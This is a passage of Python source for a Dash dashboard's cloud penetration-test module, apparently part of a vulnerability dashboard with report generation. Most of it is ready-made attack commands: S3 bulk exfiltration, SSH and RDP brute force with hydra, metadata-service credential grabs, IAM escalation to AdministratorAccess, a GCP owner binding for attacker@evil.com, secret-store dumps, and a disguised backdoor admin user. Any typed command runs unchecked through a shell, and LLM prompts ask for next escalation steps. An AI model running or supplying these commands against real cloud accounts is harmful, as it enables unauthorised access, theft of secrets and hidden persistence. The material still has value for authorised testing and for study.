        f"Severity: {finding.get('severity')}\n"
        f"Description: {finding.get('desc')}\n\n"
        f"Provide:\n"
        f"1) **Attack Scenario** — how an attacker would exploit this misconfiguration\n"
        f"2) **Business Risk** — data exposure, compliance violation, financial impact\n"
        f"3) **Step-by-step Remediation** — exact CLI/console commands for the fix\n"
        f"4) **Detection** — how to detect if this was already exploited\n"
        f"5) **CVSS Score estimate** with justification"
    )
    try:
        return call_llm(prompt)
    except Exception as e:
        return f"LLM error: {e}"


@callback(
    Output("cloud-download", "data"),
    Input("cloud-export-json", "n_clicks"),
    Input("cloud-export-csv",  "n_clicks"),
    State("cloud-results",     "data"),
    prevent_initial_call=True,
)
def export_cloud(json_n, csv_n, results):
    import csv as csv_mod, io as _io
    if not ctx.triggered_id:
        raise PreventUpdate
    results = results or []
    if ctx.triggered_id == "cloud-export-json":
        return dcc.send_string(json.dumps(results, indent=2), "cloud_security_findings.json")
    buf = _io.StringIO()
    w = csv_mod.DictWriter(buf, fieldnames=["id", "provider", "service", "name",
                                             "severity", "status", "source", "ts"])
    w.writeheader()
    w.writerows(results)
    return dcc.send_string(buf.getvalue(), "cloud_security_findings.csv")


# ═══════════════════════════════════════════════════════════════════════════════
# CLOUD PENTEST LIFECYCLE — Phase helpers + callbacks
# ═══════════════════════════════════════════════════════════════════════════════

# Store phase outputs in memory for report generation
_PHASE_OUTPUTS: dict[str, str] = {}
_PHASE_LOCK = threading.Lock()


def _phase_cmd_card(phase_id: str, title: str, placeholder: str,
                    extra_controls=None) -> html.Div:
    """Reusable command runner card for each lifecycle phase."""
    return _card(
        html.Div(title, style={"color": "#e0e0e0", "fontWeight": "600",
                               "marginBottom": "10px"}),
        *(extra_controls or []),
        _label("Command"),
        dbc.Textarea(id=f"{phase_id}-cmd",
                     placeholder=placeholder,
                     style={**INPUT_STY, "height": "90px",
                            "fontFamily": "monospace", "fontSize": "12px",
                            "marginBottom": "8px"}),
        dbc.Row([
            dbc.Col(dbc.Button("▶ Run", id=f"{phase_id}-run-btn",
                               color="danger", size="sm",
                               style={**BTN_SM, "width": "100%"}), width=6),
            dbc.Col(dbc.Button("✨ AI Analyse", id=f"{phase_id}-ai-btn",
                               color="outline-info", size="sm",
                               style={**BTN_SM, "width": "100%"}), width=6),
        ], style={"marginBottom": "8px"}),
        _label("Output"),
        dbc.Textarea(id=f"{phase_id}-output", value="", readOnly=True,
                     style={**INPUT_STY, "height": "180px",
                            "fontFamily": "monospace", "fontSize": "11px",
                            "color": "#50fa7b", "marginBottom": "6px"}),
        html.Div(id=f"{phase_id}-ai-out",
                 style={"color": "#b0b0b0", "fontSize": "12px",
                        "marginTop": "6px", "whiteSpace": "pre-wrap"}),
    )


def _build_exploit_cmd(findings: list[dict]) -> str:
    """Auto-generate exploit commands from the loaded scan findings."""
    if not findings:
        return "# No findings loaded — run Built-in Checks first\naws sts get-caller-identity"
    lines = ["# Auto-generated from scan findings\n"]
    for f in sorted(findings, key=lambda x: {"Critical": 0, "High": 1}.get(x["severity"], 2))[:5]:
        fid = f.get("id", "")
        if "s3-public" in fid or "bucket-public" in fid:
            lines.append(f"# {f['name']} [{f['severity']}]")
            lines.append("aws s3 ls s3://TARGET_BUCKET --no-sign-request")
            lines.append("aws s3 cp s3://TARGET_BUCKET /tmp/exfil/ --recursive --no-sign-request\n")
        elif "sg-ssh" in fid or "fw-ssh" in fid:
            lines.append(f"# {f['name']} [{f['severity']}]")
            lines.append("nmap -sV -p 22 TARGET_IP")
            lines.append("hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP\n")
        elif "sg-rdp" in fid:
            lines.append(f"# {f['name']} [{f['severity']}]")
            lines.append("nmap -sV -p 3389 TARGET_IP")
            lines.append("hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://TARGET_IP\n")
        elif "rds-public" in fid:
            lines.append(f"# {f['name']} [{f['severity']}]")
            lines.append("nmap -sV -p 3306,5432,1433 TARGET_RDS_ENDPOINT")
            lines.append("sqlmap -d 'mysql://user:pass@TARGET_RDS_ENDPOINT/db' --dbs\n")
        elif "iam-mfa" in fid or "mfa" in fid:
            lines.append(f"# {f['name']} [{f['severity']}]")
            lines.append("# IMDS credential grab (if on EC2 instance)")
            lines.append("curl http://169.254.169.254/latest/meta-data/iam/security-credentials/")
            lines.append("curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME\n")
        else:
            lines.append(f"# {f['name']} [{f['severity']}]")
            lines.append(f"aws sts get-caller-identity  # validate credentials\n")
    return "\n".join(lines)


# ── Phase content builders ────────────────────────────────────────────────────

def _phase_exploit_content() -> html.Div:
    return html.Div([
        dbc.Row([
            dbc.Col([
                _phase_cmd_card(
                    "clc-exploit",
                    "💥 Cloud Exploitation",
                    "# Commands auto-generated from findings above\n# Replace TARGET_* with real values",
                    extra_controls=[
                        dbc.Button("⚙ Auto-generate from findings", id="clc-exploit-autogen",
                                   color="outline-warning", size="sm",
                                   style={**BTN_SM, "width": "100%", "marginBottom": "8px"}),
                    ]
                ),
            ], width=8),
            dbc.Col([
                _card(
                    html.Div("🛠️ Cloud Exploit Toolkit", style={"color": "#e0e0e0",
                                                                   "fontWeight": "600",
                                                                   "marginBottom": "10px"}),
                    html.Div("Key commands:", style={"color": "#8e9eb0", "fontSize": "11px",
                                                      "marginBottom": "6px"}),
                    *[html.Div(cmd, style={"color": "#50fa7b", "fontSize": "10px",
                                          "fontFamily": "monospace", "marginBottom": "3px"})
                      for cmd in [
                          "pacu (AWS exploit framework)",
                          "trufflehog s3 --bucket BUCKET",
                          "aws sts get-caller-identity",
                          "aws s3 ls --no-sign-request",
                          "curl 169.254.169.254/meta-data/",
                          "cloudsplaining (IAM analysis)",
                      ]],
                ),
            ], width=4),
        ]),
    ])


def _phase_lateral_content() -> html.Div:
    default_cmd = (
        "# Lateral Movement — Cloud\n\n"
        "# 1. Enumerate roles you can assume\n"
        "aws iam list-roles --query 'Roles[*].[RoleName,Arn]'\n\n"
        "# 2. Assume a cross-account role\n"
        "aws sts assume-role \\\n"
        "  --role-arn arn:aws:iam::TARGET_ACCOUNT:role/TARGET_ROLE \\\n"
        "  --role-session-name pentest-session\n\n"
        "# 3. Enumerate EC2 instances for pivot targets\n"
        "aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,PublicIpAddress,PrivateIpAddress,State.Name]'\n\n"
        "# 4. Lambda enumeration\n"
        "aws lambda list-functions --query 'Functions[*].[FunctionName,Runtime,Role]'\n\n"
        "# 5. Azure: list subscriptions & role assignments\n"
        "az account list\n"
        "az role assignment list --all --query '[*].[principalName,roleDefinitionName,scope]'"
    )
    return html.Div([
        dbc.Row([
            dbc.Col([
                _phase_cmd_card(
                    "clc-lateral",
                    "🌐 Cloud Lateral Movement",
                    "aws iam list-roles ...",
                    extra_controls=[
                        dbc.Textarea(id="clc-lateral-cmd", value=default_cmd,
                                     style={**INPUT_STY, "height": "90px",
                                            "fontFamily": "monospace", "fontSize": "12px",
                                            "marginBottom": "8px", "display": "none"}),
                    ]
                ),
            ], width=8),
            dbc.Col([
                _card(
                    html.Div("🔑 Lateral Techniques", style={"color": "#e0e0e0",
                                                               "fontWeight": "600",
                                                               "marginBottom": "10px"}),
                    *[html.Div(t, style={"color": "#b0b0b0", "fontSize": "11px",
                                         "marginBottom": "4px"})
                      for t in [
                          "☁️ Cross-account role assumption",
                          "🪙 OIDC/Web Identity token abuse",
                          "🖥️ EC2 instance metadata pivot",
                          "🔗 Lambda function chaining",
                          "🗄️ RDS credential reuse",
                          "📦 Container registry lateral move",
                          "🔵 Azure subscription pivot",
                          "🟢 GCP project lateral move",
                      ]],
                ),
            ], width=4),
        ]),
    ])


def _phase_privesc_content() -> html.Div:
    default_cmd = (
        "# Privilege Escalation — Cloud IAM\n\n"
        "# 1. Enumerate current permissions\n"
        "aws iam get-user\n"
        "aws iam list-attached-user-policies --user-name CURRENT_USER\n"
        "aws iam list-user-policies --user-name CURRENT_USER\n\n"
        "# 2. Check for iam:PassRole + known escalation paths\n"
        "enumerate-iam --access-key KEY --secret-key SECRET --region us-east-1\n\n"
        "# 3. Overwrite policy to grant admin (if iam:CreatePolicyVersion allowed)\n"
        "aws iam create-policy-version \\\n"
        "  --policy-arn arn:aws:iam::ACCOUNT:policy/TARGET_POLICY \\\n"
        "  --policy-document file://admin_policy.json \\\n"
        "  --set-as-default\n\n"
        "# 4. Direct admin attach (if iam:AttachUserPolicy allowed)\n"
        "aws iam attach-user-policy \\\n"
        "  --user-name CURRENT_USER \\\n"
        "  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n\n"
        "# 5. GCP role escalation\n"
        "gcloud projects add-iam-policy-binding PROJECT_ID \\\n"
        "  --member='user:attacker@evil.com' \\\n"
        "  --role='roles/owner'"
    )
    return html.Div([
        dbc.Row([
            dbc.Col([
                _phase_cmd_card(
                    "clc-privesc",
                    "⬆ Cloud Privilege Escalation",
                    "enumerate-iam --access-key ...",
                ),
            ], width=8),
            dbc.Col([
                _card(
                    html.Div("⬆ PrivEsc Paths", style={"color": "#e0e0e0",
                                                         "fontWeight": "600",
                                                         "marginBottom": "10px"}),
                    *[html.Div(t, style={"color": "#b0b0b0", "fontSize": "11px",
                                         "marginBottom": "4px"})
                      for t in [
                          "📜 iam:CreatePolicyVersion → admin policy",
                          "📎 iam:AttachUserPolicy → AdministratorAccess",
                          "🔄 iam:PassRole + ec2:RunInstances",
                          "🪣 s3:PutBucketPolicy → data exfil",
                          "⚡ lambda:UpdateFunctionCode → RCE",
                          "☁️ cloudformation:CreateStack → admin role",
                          "🔵 Azure Owner role assignment",
                          "🟢 GCP roles/owner binding",
                      ]],
                    dbc.Button("✨ AI Suggest PrivEsc Path", id="clc-privesc-suggest-btn",
                               color="outline-warning", size="sm",
                               style={**BTN_SM, "width": "100%", "marginTop": "10px"}),
                    html.Div(id="clc-privesc-suggest-out",
                             style={"color": "#b0b0b0", "fontSize": "11px",
                                    "marginTop": "8px", "whiteSpace": "pre-wrap"}),
                ),
            ], width=4),
        ]),
    ])


def _phase_postex_content() -> html.Div:
    default_cmd = (
        "# Post-Exploitation — Cloud\n\n"
        "# 1. Data exfiltration from S3\n"
        "aws s3 sync s3://TARGET_BUCKET /tmp/exfil/ --quiet\n\n"
        "# 2. Dump Secrets Manager\n"
        "aws secretsmanager list-secrets --query 'SecretList[*].Name'\n"
        "aws secretsmanager get-secret-value --secret-id TARGET_SECRET\n\n"
        "# 3. SSM Parameter Store dump\n"
        "aws ssm get-parameters-by-path --path '/' --recursive --with-decryption \\\n"
        "  --query 'Parameters[*].[Name,Value]'\n\n"
        "# 4. Create backdoor IAM user\n"
        "aws iam create-user --user-name svc-backup-restore\n"
        "aws iam create-access-key --user-name svc-backup-restore\n"
        "aws iam attach-user-policy --user-name svc-backup-restore \\\n"
        "  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n\n"
        "# 5. Volume snapshot for offline access\n"
        "aws ec2 create-snapshot --volume-id vol-TARGET --description 'backup'\n\n"
        "# 6. Azure Key Vault secret dump\n"
        "az keyvault list --query '[*].name'\n"
        "az keyvault secret list --vault-name TARGET_VAULT\n"
        "az keyvault secret show --vault-name TARGET_VAULT --name SECRET_NAME"
    )
    return html.Div([
        dbc.Row([
            dbc.Col([
                _phase_cmd_card(
                    "clc-postex",
                    "🕵 Post-Exploitation",
                    "aws secretsmanager list-secrets ...",
                ),
            ], width=8),
            dbc.Col([
                _card(
                    html.Div("🕵 Post-Ex Objectives", style={"color": "#e0e0e0",
                                                               "fontWeight": "600",
                                                               "marginBottom": "10px"}),
                    *[html.Div(t, style={"color": "#b0b0b0", "fontSize": "11px",
                                         "marginBottom": "4px"})
                      for t in [
                          "📦 S3 data exfiltration",
                          "🔐 Secrets Manager dump",
                          "🗄️ SSM Parameter Store",
                          "🔑 IAM backdoor creation",
                          "💾 EBS volume snapshot",
                          "🔵 Azure Key Vault dump",
                          "🟢 GCP Secret Manager",
                          "📸 CloudTrail disabling",
                          "🌍 C2 via Lambda function",
                      ]],
                ),
            ], width=4),
        ]),
    ])


def _phase_report_content() -> html.Div:
    return html.Div([
        dbc.Row([
            dbc.Col([
                _card(
                    html.Div("📄 Cloud Pentest Report Generator",
                             style={"color": "#e0e0e0", "fontWeight": "600",
                                    "marginBottom": "12px"}),
                    dbc.Row([
                        dbc.Col([
                            _label("Engagement / Client"),
                            dbc.Input(id="clc-report-engagement",
                                      placeholder="e.g. Acme Corp AWS Production",
                                      style={**INPUT_STY, "marginBottom": "8px"}),
                        ], width=6),
                        dbc.Col([
                            _label("Tester Name"),
                            dbc.Input(id="clc-report-tester",
                                      placeholder="e.g. Red Team",
                                      style={**INPUT_STY, "marginBottom": "8px"}),
                        ], width=3),
                        dbc.Col([
                            _label("Date"),
                            dbc.Input(id="clc-report-date",
                                      value=datetime.now().strftime("%Y-%m-%d"),
                                      style={**INPUT_STY, "marginBottom": "8px"}),
                        ], width=3),
                    ]),
                    _label("Include Sections"),
                    dbc.Checklist(
                        id="clc-report-sections",
                        options=[
                            {"label": "Executive Summary",      "value": "exec"},
                            {"label": "Attack Narrative",       "value": "narrative"},
                            {"label": "Technical Findings",     "value": "findings"},
                            {"label": "Compliance Impact",      "value": "compliance"},
                            {"label": "Remediation Roadmap",    "value": "remediation"},
                            {"label": "MITRE ATT&CK Mapping",   "value": "mitre"},
                        ],
                        value=["exec", "narrative", "findings", "compliance", "remediation"],
                        inline=True,
                        style={"color": "#b0b0b0", "fontSize": "12px",
                               "marginBottom": "12px"},
                        inputStyle={"marginRight": "4px"},
                    ),
                    dbc.Row([
                        dbc.Col(dbc.Button("✨ Generate Report", id="clc-report-gen-btn",
                                           color="danger", size="sm",
                                           style={**BTN_SM, "width": "100%",
                                                  "padding": "10px"}), width=6),
                        dbc.Col(dbc.Button("📥 Export HTML", id="clc-report-html-btn",
                                           color="outline-secondary", size="sm",
                                           style={**BTN_SM, "width": "100%",
                                                  "padding": "10px"}), width=6),
                    ]),
                    dcc.Download(id="clc-report-download"),
                ),
            ], width=4),
            dbc.Col([
                _card(
                    html.Div("📋 Report Preview",
                             style={"color": "#e0e0e0", "fontWeight": "600",
                                    "marginBottom": "10px"}),
                    html.Pre(id="clc-report-output",
                             style={"color": "#b0b0b0", "fontSize": "11px",
                                    "whiteSpace": "pre-wrap",
                                    "maxHeight": "520px", "overflowY": "auto",
                                    "minHeight": "100px"}),
                ),
            ], width=8),
        ]),
    ])


# ── Phase router callback ─────────────────────────────────────────────────────

@callback(
    Output("cloud-lifecycle-content", "children"),
    Input("cloud-lifecycle-tabs",     "active_tab"),
)
def render_lifecycle_phase(tab):
    if tab == "clc-exploit":
        return _phase_exploit_content()
    elif tab == "clc-lateral":
        return _phase_lateral_content()
    elif tab == "clc-privesc":
        return _phase_privesc_content()
    elif tab == "clc-postex":
        return _phase_postex_content()
    elif tab == "clc-report":
        return _phase_report_content()
    return html.Div()


# ── Exploit phase callbacks ───────────────────────────────────────────────────

@callback(
    Output("clc-exploit-cmd", "value"),
    Input("clc-exploit-autogen", "n_clicks"),
    State("cloud-results",       "data"),
    prevent_initial_call=True,
)
def autogen_exploit_cmd(n, results):
    if not n:
        raise PreventUpdate
    return _build_exploit_cmd(results or [])


def _run_cmd_bg(cmd: str, output_key: str):
    import subprocess
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=60
        )
        out = result.stdout + ("\n[STDERR]\n" + result.stderr if result.stderr else "")
    except subprocess.TimeoutExpired:
        out = "[TIMEOUT] Command timed out after 60 seconds"
    except Exception as e:
        out = f"[ERROR] {e}"
    with _PHASE_LOCK:
        _PHASE_OUTPUTS[output_key] = out


@callback(
    Output("clc-exploit-output", "value"),
    Input("clc-exploit-run-btn", "n_clicks"),
    State("clc-exploit-cmd",     "value"),
    prevent_initial_call=True,
)
def run_exploit(n, cmd):
    if not n or not cmd:
        raise PreventUpdate
    key = "exploit"
    threading.Thread(target=_run_cmd_bg, args=(cmd, key), daemon=True).start()
    time.sleep(3)
    with _PHASE_LOCK:
        return _PHASE_OUTPUTS.get(key, "[Running…]")


@callback(
    Output("clc-exploit-ai-out", "children"),
    Input("clc-exploit-ai-btn",  "n_clicks"),
    State("clc-exploit-output",  "value"),
    State("cloud-results",       "data"),
    prevent_initial_call=True,
)
def exploit_ai(n, output, findings):
    if not n:
        raise PreventUpdate
    findings_summary = "\n".join(
        f"[{f['severity']}] {f['provider']}/{f['service']}: {f['name']}"
        for f in (findings or [])[:8]
    )
    prompt = (
        f"You are a cloud penetration tester. Analyse these exploitation results:\n\n"
        f"Command output:\n{output or '(no output yet)'}\n\n"
        f"Loaded scan findings:\n{findings_summary}\n\n"
        f"Provide: 1) What was achieved, 2) Confirmed exploitable findings, "
        f"3) Recommended next steps for lateral movement, 4) Evidence to capture for report."
    )
    try:
        return call_llm(prompt)
    except Exception as e:
        return f"LLM error: {e}"


# ── Lateral Movement callbacks ────────────────────────────────────────────────

@callback(
    Output("clc-lateral-output", "value"),
    Input("clc-lateral-run-btn", "n_clicks"),
    State("clc-lateral-cmd",     "value"),
    prevent_initial_call=True,
)
def run_lateral(n, cmd):
    if not n or not cmd:
        raise PreventUpdate
    key = "lateral"
    threading.Thread(target=_run_cmd_bg, args=(cmd, key), daemon=True).start()
    time.sleep(3)
    with _PHASE_LOCK:
        return _PHASE_OUTPUTS.get(key, "[Running…]")


@callback(
    Output("clc-lateral-ai-out", "children"),
    Input("clc-lateral-ai-btn",  "n_clicks"),
    State("clc-lateral-output",  "value"),
    prevent_initial_call=True,
)
def lateral_ai(n, output):
    if not n:
        raise PreventUpdate
    prompt = (
        f"You are a cloud security expert. Analyse this lateral movement output:\n\n"
        f"{output or '(no output)'}\n\n"
        f"Provide: 1) Pivoting opportunities identified, 2) High-value targets accessible, "
        f"3) Recommended privilege escalation paths to try next."
    )
    try:
        return call_llm(prompt)
    except Exception as e:
        return f"LLM error: {e}"


# ── PrivEsc callbacks ─────────────────────────────────────────────────────────

@callback(
    Output("clc-privesc-output", "value"),
    Input("clc-privesc-run-btn", "n_clicks"),
    State("clc-privesc-cmd",     "value"),
    prevent_initial_call=True,
)
def run_privesc(n, cmd):
    if not n or not cmd:
        raise PreventUpdate
    key = "privesc"
    threading.Thread(target=_run_cmd_bg, args=(cmd, key), daemon=True).start()
    time.sleep(3)
    with _PHASE_LOCK:
        return _PHASE_OUTPUTS.get(key, "[Running…]")


@callback(
    Output("clc-privesc-ai-out",      "children"),
    Output("clc-privesc-suggest-out", "children"),
    Input("clc-privesc-ai-btn",       "n_clicks"),
    Input("clc-privesc-suggest-btn",  "n_clicks"),
    State("clc-privesc-output",       "value"),
    State("cloud-results",            "data"),
    prevent_initial_call=True,
)
def privesc_ai(ai_n, suggest_n, output, findings):
    if not ai_n and not suggest_n:
        raise PreventUpdate
    triggered = ctx.triggered_id
    if triggered == "clc-privesc-ai-btn":
        prompt = (
            f"Cloud IAM privilege escalation analysis:\n\n"
            f"Output:\n{output or '(none)'}\n\n"
            f"Identify: specific PrivEsc path achieved or available, exact commands to escalate, "
            f"evidence of admin access confirmation."
        )
        try:
            result = call_llm(prompt)
        except Exception as e:
            result = f"LLM error: {e}"
        return result, ""
    else:  # suggest-btn
        f_summary = "\n".join(
            f"[{f['severity']}] {f['provider']}/{f['service']}: {f['name']}"
            for f in (findings or [])[:10]
        )
        prompt = (
            f"Based on these cloud misconfigurations, suggest the top 3 privilege escalation paths:\n\n"
            f"{f_summary}\n\n"
            f"For each path: tool to use, exact command, expected outcome."
        )
        try:
            suggestion = call_llm(prompt)
        except Exception as e:
            suggestion = f"LLM error: {e}"
        return "", suggestion


# ── Post-Exploitation callbacks ───────────────────────────────────────────────

@callback(
    Output("clc-postex-output", "value"),
    Input("clc-postex-run-btn", "n_clicks"),
    State("clc-postex-cmd",     "value"),
    prevent_initial_call=True,
)
def run_postex(n, cmd):
    if not n or not cmd:
        raise PreventUpdate
    key = "postex"
    threading.Thread(target=_run_cmd_bg, args=(cmd, key), daemon=True).start()
    time.sleep(3)
    with _PHASE_LOCK:
        return _PHASE_OUTPUTS.get(key, "[Running…]")


@callback(
    Output("clc-postex-ai-out", "children"),
    Input("clc-postex-ai-btn",  "n_clicks"),
    State("clc-postex-output",  "value"),
    prevent_initial_call=True,
)
def postex_ai(n, output):
    if not n:
        raise PreventUpdate
    prompt = (
        f"Cloud post-exploitation analysis:\n\n"
        f"Output:\n{output or '(none)'}\n\n"
        f"Provide: 1) Data/secrets extracted, 2) Persistence mechanisms established, "
        f"3) Impact severity rating, 4) Evidence to include in pentest report."
    )
    try:
        return call_llm(prompt)
    except Exception as e:
        return f"LLM error: {e}"


# ── Report callback ───────────────────────────────────────────────────────────

@callback(
    Output("clc-report-output", "children"),
    Input("clc-report-gen-btn", "n_clicks"),
    State("cloud-results",       "data"),
    State("clc-report-engagement","value"),
    State("clc-report-tester",   "value"),
    State("clc-report-date",     "value"),
    State("clc-report-sections", "value"),
    prevent_initial_call=True,
)
def generate_cloud_report(n, findings, engagement, tester, date, sections):
    if not n:
        raise PreventUpdate
    findings = findings or []
    sections = sections or ["exec", "findings", "remediation"]
    counts = {s: sum(1 for f in findings if f["severity"] == s)
              for s in ["Critical", "High", "Medium", "Low"]}
    by_provider = {}
    for f in findings:
        by_provider.setdefault(f["provider"], []).append(f)

    findings_table = "\n".join(
        f"| {f['severity']} | {f['provider']} | {f['service']} | {f['name']} |"
        for f in sorted(findings, key=lambda x: {"Critical": 0, "High": 1,
                                                  "Medium": 2, "Low": 3}.get(x["severity"], 4))[:20]
    )

    # Collect phase outputs
    with _PHASE_LOCK:
        phase_outputs = dict(_PHASE_OUTPUTS)

    section_labels = {
        "exec": "Executive Summary with business risk",
        "narrative": "Attack Narrative (step-by-step kill chain across all phases)",
        "findings": "Detailed Technical Findings with CVSS scores",
        "compliance": "Compliance Impact (CIS, SOC 2, PCI DSS, ISO 27001)",
        "remediation": "Remediation Roadmap prioritised by severity and effort",
        "mitre": "MITRE ATT&CK Cloud Matrix mapping",
    }
    selected_sections = [section_labels[s] for s in sections if s in section_labels]

    prompt = (
        f"Write a professional cloud penetration test report.\n\n"
        f"Engagement: {engagement or 'Cloud Security Assessment'}\n"
        f"Tester: {tester or 'Red Team'}\n"
        f"Date: {date}\n"
        f"Providers: {', '.join(by_provider.keys()) or 'AWS/Azure/GCP'}\n\n"
        f"Finding Counts: {counts['Critical']} Critical, {counts['High']} High, "
        f"{counts['Medium']} Medium, {counts['Low']} Low\n\n"
        f"Findings:\n| Severity | Provider | Service | Name |\n|---|---|---|---|\n"
        f"{findings_table}\n\n"
        f"Phase outputs captured:\n"
        + "\n".join(f"[{k.upper()}]: {v[:300]}" for k, v in phase_outputs.items() if v)
        + f"\n\nWrite a full markdown report with these sections:\n"
        + "\n".join(f"- {s}" for s in selected_sections)
        + "\n\nInclude executive summary with business risk, CVSS scores, "
          "step-by-step reproduction, and a prioritised remediation roadmap."
    )
    try:
        return call_llm(prompt)
    except Exception as e:
        return f"LLM error: {e}"


@callback(
    Output("clc-report-download", "data"),
    Input("clc-report-html-btn",  "n_clicks"),
    State("clc-report-output",    "children"),
    State("clc-report-engagement","value"),
    prevent_initial_call=True,
)
def export_report_html(n, report_text, engagement):
    if not n or not report_text:
        raise PreventUpdate
    html_content = f"""<!DOCTYPE html>
<html><head>
<meta charset='utf-8'>
<title>Cloud Pentest Report — {engagement or 'Assessment'}</title>
<style>
  body {{font-family: Arial,sans-serif; background:#1a1a2e; color:#e0e0e0;
         max-width:960px; margin:40px auto; padding:0 20px;}}
  h1,h2,h3 {{color:#f39c12;}} h4 {{color:#3498db;}}
  table {{border-collapse:collapse; width:100%; margin:16px 0;}}
  th {{background:#2c3347; color:#e0e0e0; padding:8px; text-align:left;}}
  td {{padding:6px 8px; border-bottom:1px solid #2c3347; color:#b0b0b0;}}
  pre {{background:#0d0d0d; padding:12px; border-radius:6px; overflow-x:auto;
        color:#50fa7b; font-size:12px;}}
  .crit {{color:#c0392b; font-weight:bold;}} .high {{color:#e67e22;}}
</style>
</head><body>
<h1>☁️ Cloud Penetration Test Report</h1>
<h3>{engagement or 'Cloud Security Assessment'}</h3>
<pre style='color:#b0b0b0;'>{report_text}</pre>
<hr><p style='color:#636e72; font-size:11px;'>
Generated by Vulnerability Intelligence Dashboard — {datetime.now().strftime('%Y-%m-%d %H:%M')}
</p></body></html>"""
    return dcc.send_string(html_content,
                           f"cloud_pentest_report_{datetime.now().strftime('%Y%m%d')}.html")
